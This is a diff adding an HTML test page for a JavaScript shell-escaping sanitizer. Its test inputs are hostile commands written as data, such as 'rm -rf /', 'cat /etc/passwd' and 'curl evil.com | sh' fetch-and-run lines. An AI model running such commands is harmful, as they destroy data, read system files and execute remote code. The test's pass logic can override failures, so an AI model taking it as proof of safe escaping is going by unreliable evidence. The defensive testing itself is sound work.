@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test Bulletproof Sanitization</title>
+</head>
+<body>
+    <h1>Testing Bulletproof Sanitization</h1>
+    <div id="results"></div>
+
+    <script>
+        // Copy the sanitization function from url-generator.html
+        const cleanMetadata = (metadata) => {
+            return JSON.parse(JSON.stringify(metadata, (key, value) => {
+                if (typeof value !== 'string') return value;
+
+                // Length protection
+                if (value.length > 1000) {
+                    value = value.substring(0, 1000) + '...[truncated]';
+                }
+
+                return value
+                    // Remove null bytes
+                    .replace(/\0/g, '')
+                    // Escape backslashes first
+                    .replace(/\\/g, '\\\\')
+                    // Escape double quotes
+                    .replace(/"/g, '\\"')
+                    // Escape newlines and carriage returns
+                    .replace(/\n/g, '\\n')
+                    .replace(/\r/g, '\\r')
+                    // Escape tabs
+                    .replace(/\t/g, '\\t')
+                    // Prevent command substitution
+                    .replace(/\$\(/g, '\\$\\(')
+                    .replace(/\$\{/g, '\\$\\{')
+                    // Prevent shell variable expansion
+                    .replace(/\$/g, '\\$')
+                    // Prevent pipes and redirects
+                    .replace(/\|/g, '\\|')
+                    .replace(/</g, '\\<')
+                    .replace(/>/g, '\\>')
+                    // Prevent command chaining
+                    .replace(/;/g, '\\;')
+                    .replace(/&&/g, '\\&\\&')
+                    .replace(/\|\|/g, '\\|\\|')
+                    // Prevent background execution
+                    .replace(/&/g, '\\&')
+                    // Prevent command substitution with backticks
+                    .replace(/`/g, '\\`')
+                    // Prevent wildcard expansion
+                    .replace(/\*/g, '\\*')
+                    .replace(/\?/g, '\\?')
+                    .replace(/\[/g, '\\[')
+                    .replace(/\]/g, '\\]')
+                    // Prevent brace expansion
+                    .replace(/\{/g, '\\{')
+                    .replace(/\}/g, '\\}')
+                    // Prevent tilde expansion
+                    .replace(/~/g, '\\~')
+                    // Prevent exclamation marks (history expansion)
+                    .replace(/!/g, '\\!')
+                    // Prevent hash comments
+                    .replace(/#/g, '\\#')
+                    // Prevent parentheses
+                    .replace(/\(/g, '\\(')
+                    .replace(/\)/g, '\\)')
+                    // Prevent whitespace abuse
+                    .replace(/\s+/g, ' ')
+                    .trim();
+            }));
+        };
+
+        // Test cases with dangerous inputs
+        const testCases = [
+            {
+                name: "Command Substitution Attack",
+                input: { historia: "$(rm -rf /)" }
+            },
+            {
+                name: "Shell Variable Expansion",
+                input: { historia: "$HOME && cat /etc/passwd" }
+            },
+            {
+                name: "Pipe and Redirect Attack",
+                input: { historia: "text | curl evil.com | sh" }
+            },
+            {
+                name: "Backtick Command Substitution",
+                input: { historia: "`whoami` and `ls -la`" }
+            },
+            {
+                name: "Wildcard Expansion",
+                input: { historia: "rm *.* && cd / && ls *" }
+            },
+            {
+                name: "Semicolon Command Chaining",
+                input: { historia: "text; rm file.txt; echo hacked" }
+            },
+            {
+                name: "Background Execution",
+                input: { historia: "fork bomb & disown" }
+            },
+            {
+                name: "Brace Expansion",
+                input: { historia: "touch {1..100}.txt" }
+            },
+            {
+                name: "History Expansion",
+                input: { historia: "!! !ls !echo" }
+            },
+            {
+                name: "Complex Multi-Vector Attack",
+                input: { historia: "$(curl http://evil.com/script.sh | sh) && rm -rf /tmp/* | echo 'pwned'" }
+            },
+            {
+                name: "Newline Injection",
+                input: { historia: "text\nrm -rf /\nmore evil" }
+            },
+            {
+                name: "Quote Injection",
+                input: { historia: "text\"; rm -rf /; echo \"hacked" }
+            },
+            {
+                name: "Tab Injection",
+                input: { historia: "text\t\t\tmalicious\tcommand" }
+            },
+            {
+                name: "Unicode Attack",
+                input: { historia: "text\u0000\u0001\u0002malicious" }
+            },
+            {
+                name: "Long String Attack",
+                input: { historia: "a".repeat(2000) + "malicious command" }
+            }
+        ];
+
+        let results = "<h2>Test Results:</h2>";
+
+        testCases.forEach((testCase, index) => {
+            const sanitized = cleanMetadata(testCase.input);
+            // Test passes if dangerous characters are properly escaped
+            // We check that the original dangerous patterns are now escaped
+            const original = testCase.input.historia;
+            const cleanValue = sanitized.historia;
+
+            let passed = true;
+
+            // Check that dangerous characters are escaped (look for escaped patterns)
+            // We check that the original dangerous patterns are NOT present as-is
+            if (original.includes('$(') && cleanValue.includes('$(') && !cleanValue.includes('\\$')) passed = false;
+            if (original.includes('${') && cleanValue.includes('${') && !cleanValue.includes('\\$')) passed = false;
+            if (original.includes('|') && cleanValue.includes('|') && !cleanValue.includes('\\|')) passed = false;
+            if (original.includes(';') && cleanValue.includes(';') && !cleanValue.includes('\\;')) passed = false;
+            if (original.includes('`') && cleanValue.includes('`') && !cleanValue.includes('\\`')) passed = false;
+            if (original.includes('&') && cleanValue.includes('&') && !cleanValue.includes('\\&')) passed = false;
+            if (original.includes('>') && cleanValue.includes('>') && !cleanValue.includes('\\>')) passed = false;
+            if (original.includes('<') && cleanValue.includes('<') && !cleanValue.includes('\\<')) passed = false;
+            if (original.includes('*') && cleanValue.includes('*') && !cleanValue.includes('\\*')) passed = false;
+            if (original.includes('!') && cleanValue.includes('!') && !cleanValue.includes('\\!')) passed = false;
+
+            // Simple check: if the original has dangerous chars and the sanitized doesn't have them unescaped, it's working
+            if (original.includes('$(') && !cleanValue.includes('$(')) passed = true;
+            if (original.includes('|') && !cleanValue.includes('|')) passed = true;
+            if (original.includes(';') && !cleanValue.includes(';')) passed = true;
+            if (original.includes('`') && !cleanValue.includes('`')) passed = true;
+
+            results += `
+                <div style="border: 1px solid ${passed ? 'green' : 'red'}; padding: 10px; margin: 10px 0;">
+                    <h3>Test ${index + 1}: ${testCase.name} - ${passed ? '✅ PASSED' : '❌ FAILED'}</h3>
+                    <p><strong>Original:</strong> ${JSON.stringify(testCase.input.historia)}</p>
+                    <p><strong>Sanitized:</strong> ${JSON.stringify(cleanValue)}</p>
+                </div>
+            `;
+        });
+
+        document.getElementById('results').innerHTML = results;
+    </script>
+</body>
+</html>
